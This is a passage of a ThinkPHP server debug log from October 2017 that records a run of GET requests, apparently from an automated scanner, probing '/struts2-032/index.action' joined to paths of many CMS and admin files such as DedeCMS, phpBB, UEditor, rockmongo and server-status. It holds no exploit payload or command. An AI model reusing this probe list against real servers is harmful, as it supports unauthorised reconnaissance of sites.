  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actioninclude/js/ajax_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:37+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionres/js/dev/pages/common/global.js
[ info ] 119.29.24.237/struts2-032/index.actionres/js/dev/pages/common/global.js [运行时间：0.023575s][吞吐率：42.42req/s] [内存消耗：975.62kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionres',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionres/js/dev/pages/common/global_js' => '',
  'dev' => 'pages',
  'common' => 'global.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:37+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionjs/wind_editor.js
[ info ] 119.29.24.237/struts2-032/index.actionjs/wind_editor.js [运行时间：0.016373s][吞吐率：61.08req/s] [内存消耗：975.06kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionjs',
    2 => 'wind_editor.js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionjs/wind_editor_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:38+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionstyles/prosilver/template/forum_fn.js
[ info ] 119.29.24.237/struts2-032/index.actionstyles/prosilver/template/forum_fn.js [运行时间：0.017697s][吞吐率：56.51req/s] [内存消耗：975.60kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionstyles',
    2 => 'prosilver',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionstyles/prosilver/template/forum_fn_js' => '',
  'template' => 'forum_fn.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:39+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionstyles/prosilver/template/styleswitcher.js
[ info ] 119.29.24.237/struts2-032/index.actionstyles/prosilver/template/styleswitcher.js [运行时间：0.017634s][吞吐率：56.71req/s] [内存消耗：975.66kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionstyles',
    2 => 'prosilver',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionstyles/prosilver/template/styleswitcher_js' => '',
  'template' => 'styleswitcher.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:39+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actioneditor/ubb/uploader.js
[ info ] 119.29.24.237/struts2-032/index.actioneditor/ubb/uploader.js [运行时间：0.019235s][吞吐率：51.99req/s] [内存消耗：975.08kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actioneditor',
    2 => 'ubb',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actioneditor/ubb/uploader_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:40+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actiontemplate/default/style.css
[ info ] 119.29.24.237/struts2-032/index.actiontemplate/default/style.css [运行时间：0.016428s][吞吐率：60.87req/s] [内存消耗：975.11kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actiontemplate',
    2 => 'default',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actiontemplate/default/style_css' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:41+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionstatic/js/reset.js
[ info ] 119.29.24.237/struts2-032/index.actionstatic/js/reset.js [运行时间：0.024716s][吞吐率：40.46req/s] [内存消耗：975.05kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionstatic',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionstatic/js/reset_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:41+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionimages/js/common.js
[ info ] 119.29.24.237/struts2-032/index.actionimages/js/common.js [运行时间：0.017780s][吞吐率：56.24req/s] [内存消耗：975.07kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionimages',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionimages/js/common_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:42+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actiontemplets/style/dede.css
[ info ] 119.29.24.237/struts2-032/index.actiontemplets/style/dede.css [运行时间：0.023666s][吞吐率：42.25req/s] [内存消耗：975.07kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actiontemplets',
    2 => 'style',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actiontemplets/style/dede_css' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:43+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actioninclude/dedeajax2.js
[ info ] 119.29.24.237/struts2-032/index.actioninclude/dedeajax2.js [运行时间：0.023494s][吞吐率：42.56req/s] [内存消耗：975.07kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actioninclude',
    2 => 'dedeajax2.js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actioninclude/dedeajax2_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:43+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionimages/default/inc.js
[ info ] 119.29.24.237/struts2-032/index.actionimages/default/inc.js [运行时间：0.021440s][吞吐率：46.64req/s] [内存消耗：975.07kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionimages',
    2 => 'default',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionimages/default/inc_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:44+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionjs/lang/core/zh-cn.js
[ info ] 119.29.24.237/struts2-032/index.actionjs/lang/core/zh-cn.js [运行时间：0.020306s][吞吐率：49.25req/s] [内存消耗：975.33kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionjs',
    2 => 'lang',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionjs/lang/core/zh-cn_js' => '',
  'core' => 'zh-cn.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:45+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionjs/lang/cms/zh-cn.js
[ info ] 119.29.24.237/struts2-032/index.actionjs/lang/cms/zh-cn.js [运行时间：0.019366s][吞吐率：51.64req/s] [内存消耗：975.30kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionjs',
    2 => 'lang',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionjs/lang/cms/zh-cn_js' => '',
  'cms' => 'zh-cn.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:45+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actiond/js/acmsd/ecms_dialog.js
[ info ] 119.29.24.237/struts2-032/index.actiond/js/acmsd/ecms_dialog.js [运行时间：0.018368s][吞吐率：54.44req/s] [内存消耗：975.38kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actiond',
    2 => 'js',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actiond/js/acmsd/ecms_dialog_js' => '',
  'acmsd' => 'ecms_dialog.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:46+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionskin/default/js/tabs.js
[ info ] 119.29.24.237/struts2-032/index.actionskin/default/js/tabs.js [运行时间：0.025301s][吞吐率：39.52req/s] [内存消耗：975.30kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionskin',
    2 => 'default',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionskin/default/js/tabs_js' => '',
  'js' => 'tabs.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:47+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionmedia/system/js/tab.js
[ info ] 119.29.24.237/struts2-032/index.actionmedia/system/js/tab.js [运行时间：0.022004s][吞吐率：45.45req/s] [内存消耗：975.30kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionmedia',
    2 => 'system',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionmedia/system/js/tab_js' => '',
  'js' => 'tab.js',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:48+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionmedia/system/css/mootree.css
[ info ] 119.29.24.237/struts2-032/index.actionmedia/system/css/mootree.css [运行时间：0.020046s][吞吐率：49.89req/s] [内存消耗：975.38kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionmedia',
    2 => 'system',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionmedia/system/css/mootree_css' => '',
  'css' => 'mootree.css',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:49+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionlang/zh/front.js
[ info ] 119.29.24.237/struts2-032/index.actionlang/zh/front.js [运行时间：0.024275s][吞吐率：41.19req/s] [内存消耗：975.06kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionlang',
    2 => 'zh',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionlang/zh/front_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:50+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionstyle/default/content.css
[ info ] 119.29.24.237/struts2-032/index.actionstyle/default/content.css [运行时间：0.023858s][吞吐率：41.91req/s] [内存消耗：975.08kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionstyle',
    2 => 'default',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionstyle/default/content_css' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:50+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionlang/zh/edit.js
[ info ] 119.29.24.237/struts2-032/index.actionlang/zh/edit.js [运行时间：0.018976s][吞吐率：52.70req/s] [内存消耗：975.04kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionlang',
    2 => 'zh',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionlang/zh/edit_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:51+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionrockmongo/
[ info ] 119.29.24.237/struts2-032/index.actionrockmongo/ [运行时间：0.016895s][吞吐率：59.19req/s] [内存消耗：975.04kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionrockmongo',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionrockmongo/' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:52+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionserver-status
[ info ] 119.29.24.237/struts2-032/index.actionserver-status [运行时间：0.018790s][吞吐率：53.22req/s] [内存消耗：975.05kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionserver-status',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionserver-status' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:52+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionueditor.all.js
[ info ] 119.29.24.237/struts2-032/index.actionueditor.all.js [运行时间：0.023951s][吞吐率：41.75req/s] [内存消耗：975.05kb] [文件加载：36]
[ info ] [ LANG ] C:\wwwroot\119.29.24.237\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'struts2-032',
    1 => 'index.actionueditor.all.js',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'xx=xxx',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'referer' => 'http://119.29.24.237:80/struts2-032/index.action',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'close',
  'host' => '119.29.24.237',
)
[ info ] [ PARAM ] array (
  '/struts2-032/index_actionueditor_all_js' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2017-10-06T13:43:53+08:00 ] 10.135.33.45 101.226.35.225 GET /struts2-032/index.actionwikilib.d/PmWiki.ChangeLog
